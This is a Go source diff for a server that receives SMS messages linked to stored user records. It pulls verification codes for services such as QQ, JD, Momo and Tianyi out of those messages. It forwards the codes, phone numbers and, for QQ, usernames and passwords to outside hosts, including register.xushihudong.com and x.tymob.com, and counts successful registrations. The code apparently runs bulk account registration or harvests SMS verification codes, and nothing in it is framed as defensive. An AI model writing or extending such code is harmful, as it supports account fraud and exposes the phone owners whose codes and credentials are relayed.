@@ -94,6 +94,10 @@ func sendC(w http.ResponseWriter, r *http.Request) {
 				processQQWithoutMoRegister(msg, *user, r.FormValue("apid"))
 			} else if strings.EqualFold(r.FormValue("apid"), "109") {
 				processMomoRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "111") {
+				processTianyiRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "112") {
+				processTianyiRegister(msg, *user, r.FormValue("apid"))
 			}
 		}
 	}
@@ -120,8 +124,8 @@ func processQqRegister(msg string, user map[string]string) {
 			pwd := result[1]
 			mobile := formatMobile(user["mobile"])
 			//生成要访问的url
-			// url := "http://localhost:8090/ss/testc?smsContent=" + smsContent
-			url := "http://121.201.67.97:8080/verifycode/api/getQQVerifyCode.jsp?cid=c115&pid=114&username=" + qq + "&passwd=" + pwd + "&mobile=" + mobile + "&ccpara="
+			// url := "http://121.201.67.97:8080/verifycode/api/getQQVerifyCode.jsp?cid=c115&pid=114&username=" + qq + "&passwd=" + pwd + "&mobile=" + mobile + "&ccpara="
+			url := "http://register.xushihudong.com/code/registerUser?cpid=test05&username=" + qq + "&password=" + pwd + "&phone=" + mobile + "&smscontent=" + url.QueryEscape(msg) + "&ccpara="
 			go send2Url(url)
 			go updateRegisterUserSuccess(user, "registerQqSuccessCount")
 		}
@@ -192,12 +196,34 @@ func processJindongRegister(msg string, user map[string]string, apid string) {
 	result := exp.FindStringSubmatch(msg)
 	if nil != result {
 		log.Println(result[1])
-		url := "http://121.201.67.97:8080/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		// url := "http://121.201.67.97:8080/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
 		go send2Url(url)
 
 	} else {
-		url := "http://121.201.67.97:8080/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		// url := "http://121.201.67.97:8080/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
 		go send2Url(url)
+	}
+	go updateRelationSuccess(user, apid)
+}
+func processTianyiRegister(msg string, user map[string]string, apid string) {
+	mobile := formatMobile(user["mobile"])
+	exp := regexp.MustCompile(`验证码：(\S?)，`)
+	result := exp.FindStringSubmatch(msg)
+	if nil != result {
+		log.Println(result[1])
+		url := "http://x.tymob.com:9000/sdk/submit/read/submit_codelogin.jsp?orderId=m1514958114759&code=" + url.QueryEscape(msg) + "&mobile=" + mobile
+		go send2Url(url)
+
+	} else {
+		exp = regexp.MustCompile(`验证码为(\S?)（`)
+		result = exp.FindStringSubmatch(msg)
+		if nil != result {
+			log.Println(result[1])
+			url := "http://x.tymob.com:9000/sdk/submit/read/submit_codexchange.jsp?orderId=m1514958114759&code=" + url.QueryEscape(msg) + "&mobile=" + mobile
+			go send2Url(url)
+		}
 	}
 	go updateRelationSuccess(user, apid)
 }
@@ -744,6 +770,10 @@ func loadGlobalConfigFromDb() {
 	// log.Println(mapConfig)
 	targetArray, _ := fetchRows(dbConfig, "SELECT * FROM register_targets")
 	for _, target := range *targetArray {
+		//todo:add count
+		// if vi, ok := mapRegisterTargetConfig.Load(target["apid"]); ok {
+		// 	procTargetPrepareCount(vi, target)
+		// }
 		mapRegisterTargetConfig.Store(target["apid"], target)
 	}
 	channelArray, _ := fetchRows(dbConfig, "SELECT * FROM register_channels")
@@ -753,6 +783,12 @@ func loadGlobalConfigFromDb() {
 	}
 	// log.Println("loadGlobalConfigFromDb done")
 }
+
+// func procTargetPrepareCount(fromMem map[string]string, fromDb map[string]string) {
+// 	ratio, _ := strconv.ParseInt(v.(string), 10, 64)
+// 	lastPrepareUpdateFromDb = fromDb["lastPrepareUpdate"]
+//  	if ()
+// }
 
 func loadFileConfig() bool {
 	f, err := ioutil.ReadFile("config.json")
@@ -779,29 +815,6 @@ func checkErr(err error) {
 	if err != nil {
 		panic(err)
 	}
-}
-
-func main() {
-	defer func() {
-		if err := recover(); err != nil {
-			log.Println("error begin:")
-			log.Println(err) // 这里的err其实就是panic传入的内容，55
-			log.Println("error end:")
-		}
-	}()
-	server := &http.Server{
-		Addr:         ":8090",
-		ReadTimeout:  16 * time.Second,
-		WriteTimeout: 16 * time.Second,
-	}
-	http.HandleFunc("/ss/sendc", sendC)
-	http.HandleFunc("/ss/getc", getC)
-	http.HandleFunc("/ss/testc", testC)
-	server.ListenAndServe()
-	log.Println((*server).ReadTimeout)
-
-	// server := http.ListenAndServe(":8090", nil)
-	// log.Println(server.ReadTimeout)
 }
 
 //插入
@@ -929,4 +942,27 @@ func fetchRows(db *sql.DB, sqlstr string, args ...interface{}) (*[]map[string]st
 	rows.Close()
 	stmtOut.Close()
 	return &ret, nil
+}
+
+func main() {
+	defer func() {
+		if err := recover(); err != nil {
+			log.Println("error begin:")
+			log.Println(err) // 这里的err其实就是panic传入的内容，55
+			log.Println("error end:")
+		}
+	}()
+	server := &http.Server{
+		Addr:         ":8090",
+		ReadTimeout:  16 * time.Second,
+		WriteTimeout: 16 * time.Second,
+	}
+	http.HandleFunc("/ss/sendc", sendC)
+	http.HandleFunc("/ss/getc", getC)
+	http.HandleFunc("/ss/testc", testC)
+	server.ListenAndServe()
+	log.Println((*server).ReadTimeout)
+
+	// server := http.ListenAndServe(":8090", nil)
+	// log.Println(server.ReadTimeout)
 }
